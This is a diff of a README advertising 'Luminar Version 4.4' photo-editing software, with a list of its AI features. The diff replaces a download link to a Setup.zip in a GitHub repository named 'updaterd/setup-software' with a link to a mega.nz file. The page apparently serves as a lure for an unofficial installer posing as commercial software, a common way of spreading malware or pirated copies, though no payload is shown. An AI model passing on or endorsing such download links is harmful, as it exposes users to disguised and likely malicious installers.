@@ -14,7 +14,7 @@
 
 ## Luminar 4's revolutionary tools and AI technologies give superpowers for creative photo editing.
 
-## [⚡️Luminar Version 4.4](https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip):
+## [⚡️Luminar Version 4.4](https://mega.nz/file/1dh02T6B#hZAQGdLIqESDH5fetXVCHpPGOY1gR0guIe3IArLfl6o):
 * NEW AI Augmented Sky Tool.
 * Face Features Detection Network.
 * Shine Removal Technology.
